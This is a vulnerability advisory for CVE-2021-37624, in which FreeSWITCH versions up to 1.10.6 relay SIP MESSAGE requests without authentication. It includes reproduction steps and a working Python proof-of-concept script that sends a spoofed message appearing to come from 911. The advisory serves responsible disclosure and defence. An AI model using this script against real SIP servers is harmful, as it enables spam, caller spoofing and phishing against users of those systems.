# FreeSWITCH does not authenticate SIP MESSAGE requests, leading to spam and message spoofing

- Fixed versions: v1.10.7
- Enable Security Advisory: https://github.com/EnableSecurity/advisories/tree/master/ES2021-07-freeswitch-SIP-MESSAGE-without-auth
- Vendor Security Advisory: https://github.com/signalwire/freeswitch/security/advisories/GHSA-mjcm-q9h8-9xv3
- Other references: CVE-2021-37624
- Tested vulnerable versions: <= v1.10.6
- Timeline:
    - Report date: 2021-06-07
	- Fix provided for testing: 2021-07-27
	- Vendor release with fix: 2021-10-24
	- Enable Security advisory: 2021-10-25

## Description

By default, SIP requests of the type MESSAGE (RFC 3428) are not authenticated in the affected versions of FreeSWITCH. MESSAGE requests are relayed to SIP user agents registered with the FreeSWITCH server without requiring any authentication. Although this behaviour can be changed by setting the `auth-messages` parameter to `true`, it is not the default setting.

## Impact

Abuse of this security issue allows attackers to send SIP MESSAGE messages to any SIP user agent that is registered with the server without requiring authentication. Additionally, since no authentication is required, chat messages can be spoofed to appear to come from trusted entities. Therefore, abuse can lead to spam and enable social engineering, phishing and similar attacks.

We are issuing this advisory because, in the course of our work, we have noticed that most FreeSWITCH installations that are exposed to the Internet do not authenticate MESSAGE requests.

## How to reproduce the issue

1. Install FreeSWITCH v1.10.6 or lower
2. Run FreeSWITCH using the default configuration
3. Register as a legitimate SIP user with the FreeSWITCH server (e.g. `sip:1000@192.168.1.100` where `192.168.1.100` is your FreeSWITCH server) using a softphone that can process MESSAGE (such as Zoiper)
4. Save the below Python script to `anon-message.py`
5. Run the Python script `python anon-message.py <freeswitch_ip> <target_extension>`
6. Observe the SIP message appear on your softphone, pretending to be from 911


```python
import sys, socket, random, string

UDP_IP = sys.argv[1]
UDP_PORT = 5060
ext = sys.argv[2]
rand = ''.join(random.choice(string.ascii_lowercase) for i in range(8))
msg="MESSAGE sip:%s@%s SIP/2.0\r\n" % (ext, UDP_IP)
msg+="Via: SIP/2.0/UDP 192.168.1.159:46896;rport;branch=z9hG4bK-%s\r\n" % rand
msg+="Max-Forwards: 70\r\n"
msg+="From: 911 <sip:911@%s>;tag=%s\r\n" %(UDP_IP, rand)
msg+="To: <sip:%s@%s>\r\n" %(ext, UDP_IP)
msg+="Call-ID: %s\r\n" % rand
msg+="CSeq: 1 MESSAGE\r\n"
msg+="Contact: <sip:911@192.168.1.159:48760;transport=udp>\r\n"
msg+="Content-Type: text/plain\r\n"
msg+="Content-Length: 5\r\n\r\n"
msg+="hello"

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(msg.encode(), (UDP_IP, UDP_PORT))
```

## Solution and recommendations

Upgrade to a version of FreeSWITCH that fixes this issue.

Our suggestion to the FreeSWITCH developers was the following:

> Our recommendation is that this SIP message type is authenticated by default so that FreeSWITCH administrators do not need to explicitly set the `auth-messages` parameter. When following such a recommendation, a new parameter can be introduced to explicitly disable authentication.

## About Enable Security

[Enable Security](https://www.enablesecurity.com) develops offensive security tools and provides quality penetration testing to help protect your real-time communications systems against attack.

## Disclaimer

The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.

## Disclosure policy

This report is subject to Enable Security's vulnerability disclosure policy which can be found at <https://github.com/EnableSecurity/Vulnerability-Disclosure-Policy>.

